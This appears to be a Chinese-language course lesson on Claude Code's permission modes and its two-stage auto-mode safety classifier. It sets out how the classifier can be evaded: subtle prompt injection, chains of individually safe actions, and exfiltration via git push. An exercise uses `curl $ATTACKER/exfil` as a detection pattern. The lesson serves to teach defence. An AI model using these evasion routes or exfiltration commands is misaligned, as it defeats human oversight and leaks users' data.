# Claude Code 作为自主智能体：权限模式与自动模式

> Claude Code 提供七种权限模式。"plan" 在每次操作前询问，"default" 仅对高风险操作询问，"acceptEdits" 自动批准文件写入但仍确认 shell 执行，"bypassPermissions" 批准所有操作。自动模式（2026年3月24日）用两阶段并行安全分类器替代逐操作批准：单 token 快速检查对每个操作运行；被标记的操作触发思维链深度审查。操作预算通过 `max_turns` 和 `max_budget_usd` 强制执行。自动模式作为研究预览发布——Anthropic 已明确表示分类器单独使用并不充分。

**类型：** 学习
**语言：** Python（标准库，两阶段分类器模拟器）
**前置条件：** 阶段 15 · 01（长周期智能体），阶段 15 · 09（编码智能体生态）
**时间：** ~45 分钟

## 问题

你机器上的自主编码智能体是一个独特的安全类别。攻击面是智能体能触及的一切——文件系统、网络、凭据、剪贴板、任何浏览器标签页、任何打开的终端。Bruce Schneier 等人已公开指出：计算机使用智能体不是聊天机器人的"功能更新"，而是一种具有新型风险特征的新工具。

Claude Code 的权限系统是 Anthropic 的答案。不是单一的"自主/不自主"开关，而是七种模式跨越能力阶梯：plan → default → acceptEdits → … → bypassPermissions。每种模式都是速度与逐操作审查之间的不同权衡。自动模式（2026年3月）添加了一个两阶段分类器，将分类器判断为安全的操作的批准从用户关键路径上移除，同时为分类器标记的操作保留审查层。

工程问题：这个系统能捕获什么，会遗漏什么，以及给定任务实际上需要哪种模式？

## 概念

### 七种权限模式

| 模式 | 行为 | 使用场景 |
|---|---|---|
| `plan` | 智能体提出计划；用户批准整个计划；每次操作在执行前都经过审查 | 不熟悉的任务；类生产代码；首次在仓库上使用智能体 |
| `default` | 智能体运行操作；对任何"高风险"操作提示用户（shell 执行、破坏性操作、网络调用） | 大多数交互式编码会话 |
| `acceptEdits` | 文件写入自动批准；shell 执行和网络调用仍提示 | 跨多个文件的重构过程 |
| `acceptExec` | Shell 命令在精选允许列表内自动批准；写入自动批准 | 紧密内循环，其中每个 shell 命令都是 `npm test` 或类似命令 |
| `autoMode` | 两阶段安全分类器；被标记的操作升级到审查 | 受限工作空间中的长周期无人值守运行 |
| `yolo` | 跳过大多数提示；仍运行工具允许列表/拒绝列表 | 临时沙箱、CI 作业、研究脚本 |
| `bypassPermissions` | 批准所有操作 | 文档说明为"仅在您愿意丢弃的临时容器内" |

（上述名称与公开 Claude Code 文档一致；"yolo" 是宽松中间地带的非正式简称。）

### 自动模式概览

自动模式（2026年3月24日发布）是第一个将逐操作批准委托给模型的权限模式。结构：

1. **阶段 1 — 单 token 分类器。** 对每个提议的操作运行。成本低。返回"安全"或"标记"。设计为与主导智能体循环并行运行，因此批准的操作不会排队等待。

2. **阶段 2 — 二级策略/安全审查。** 仅对被标记的操作运行。对操作、会话当前状态和声明任务执行聚焦的策略和安全评估。如果置信度低，则升级到用户 HITL（人在回路）。

预算控制与分类器并列：

- `max_turns` — 会话中的总迭代次数。
- `max_budget_usd` — 中止会话的美元上限。
- 每个工具的操作计数限制（不超过 N 次 `WebFetch` 调用等）。

### 系统能捕获什么

- 工具输入中直接的提示注入，其中注入的指令映射到已知高风险操作形态。
- 重复工具循环——分类器可以看到操作 N+1 与操作 N 几乎相同，连续五次。
- 在原本仅文件编辑的会话中明显超出范围的 shell 命令。

### 系统可能遗漏什么

- **微妙提示注入**，在不产生单个被标记操作的情况下调节行为。间接提示注入不是完全可修补的漏洞（OpenAI 准备负责人，2025年，关于浏览器智能体——参见课程 11）。
- **语义级不当行为。** 每个单独操作看起来都安全，而组合轨迹是有害的。分类器判断操作；它不会重新推导用户的意图。
- **通过合法渠道外泄。** 将数据写入您拥有的文件，然后 `git push` 到公共仓库，是一系列允许操作，其组合才是问题。

### 研究预览框架

Anthropic 将自动模式作为研究预览发布。文档明确表示分类器是一层，不是解决方案：用户应将自动模式与预算、允许列表、隔离工作空间和轨迹审计结合使用（课程 12-16）。预览框架也反映了文档化的评估与部署差距（课程 1）——通过离线评估的分类器在用户上下文模糊的真实会话中可能表现不同。

### 这个阶梯在您工作流中的位置

- 不熟悉的任务：从 `plan` 开始。阅读计划比回滚错误运行更便宜。
- 已知重构：`acceptEdits` 节省大量确认点击。
- 无人值守后台运行：`autoMode` 仅在使用您已测量爆炸半径的工作空间内（无凭据、无生产挂载、无您未选择的外泄）。
- 临时容器：`yolo` / `bypassPermissions` 仅在容器及其凭据是可丢弃的情况下才可接受。

## 使用

`code/main.py` 模拟两阶段分类器。阶段 1 是对提议操作的廉价关键字规则；阶段 2 是较慢的多规则审查器。驱动程序输入短合成轨迹（安全操作、提示注入尝试、重复循环）并显示分类器在哪里捕获和在哪里遗漏。

## 交付

`outputs/skill-permission-mode-picker.md` 将任务描述匹配到正确的权限模式、预算上限和所需隔离。

## 练习

1. 运行 `code/main.py`。哪种合成操作类型从不被阶段 1 标记但总被阶段 2 捕获？哪种都不被捕获？

2. 扩展阶段 1 规则集以捕获特定已知不良形态（例如，`curl $ATTACKER/exfil`）。测量在良性操作样本上的误报率。

3. 阅读 Anthropic 的"智能体循环如何工作"文档。列出智能体在 `default` 模式下默认触及的每个外部状态。在无人值守运行 `autoMode` 之前，您需要单独限制哪些？

4. 设计一个 24 小时无人值守运行预算：`max_turns`、`max_budget_usd`、每工具上限、允许列表。证明每个数字的合理性。

5. 描述一个轨迹，其中每个单独操作都被阶段 1 和阶段 2 批准，但组合行为是不对齐的。（课程 14 涵盖紧急停止开关和金丝雀令牌如何解决此问题。）

## 关键术语

| 术语 | 人们的说法 | 实际含义 |
|---|---|---|
| 权限模式 | "智能体能做多少" | 七种命名策略之一，控制逐操作批准 |
| plan 模式 | "任何操作前询问" | 智能体编写计划；用户在执行前批准 |
| acceptEdits | "让它写文件" | 文件写入自动批准；shell 执行仍提示 |
| autoMode | "自动批准" | 两阶段安全分类器；被标记操作升级 |
| bypassPermissions | "完全 YOLO" | 批准所有操作；用于临时容器 |
| 阶段 1 分类器 | "快速 token 检查" | 对提议操作的单 token 规则；并行运行 |
| 阶段 2 分类器 | "深度审查" | 对被标记操作的思维链推理 |
| 研究预览 | "非 GA" | Anthropic 对失败模式仍在映射的功能的框架 |
